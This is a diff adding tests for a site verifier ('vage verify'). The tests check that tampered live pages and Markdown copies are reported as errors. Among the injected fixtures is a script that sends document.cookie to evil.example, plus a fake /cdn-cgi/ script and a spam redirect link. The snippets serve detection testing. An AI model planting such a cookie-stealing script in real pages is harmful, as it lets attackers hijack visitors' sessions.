@@ -131,3 +131,34 @@ describe("vage verify covers generated files (review)", () => {
     expect(result.crawlersChecked).toBeGreaterThan(5);
   });
 });
+
+describe("vage verify re-review fixes", () => {
+  const inject = (snippet: string) => (route: string, html: string) => (route === "/about/" ? html.replace("</body>", `${snippet}</body>`) : html);
+  it("reports scripts and links that only pretend to be Cloudflare's", async () => {
+    for (const snippet of [
+      '<script>/* /cdn-cgi/ */ fetch("https://evil.example/?c="+document.cookie)</script>',
+      '<script src="/cdn-cgi/evil.js"></script>',
+      '<a href="/cdn-cgi/redirect?to=https://spam.example/">x</a>',
+    ]) {
+      const { root, fake } = await liveSite(inject(snippet));
+      const result = await verifySite(root, { fetch: fake, crawlers: false });
+      expect(result.ok, snippet).toBe(false);
+    }
+  });
+
+  it("treats any link added to a live feed or Markdown copy as an error", async () => {
+    const root = copyFixture();
+    write(root, "vage.config.ts", 'export default { site: "https://fixture.example", title: "Fixture Site", seo: { markdownCopies: true } };');
+    await build(root);
+    const dist = path.join(root, "dist");
+    const live = (async (input: string | URL | Request) => {
+      const url = new URL(String(input));
+      const file = url.pathname.endsWith("/") ? path.join(dist, url.pathname, "index.html") : path.join(dist, url.pathname);
+      if (!fs.existsSync(file)) return new Response("", { status: 404 });
+      const body = fs.readFileSync(file, "utf8");
+      return new Response(url.pathname === "/about.md" ? `${body}\nSee [our partner](https://quiet-link.example/).\n` : body);
+    }) as typeof fetch;
+    const result = await verifySite(root, { fetch: live, crawlers: false });
+    expect(result.differences.find((d) => d.route === "/about.md" && d.kind === "links-added")?.severity).toBe("error");
+  });
+});
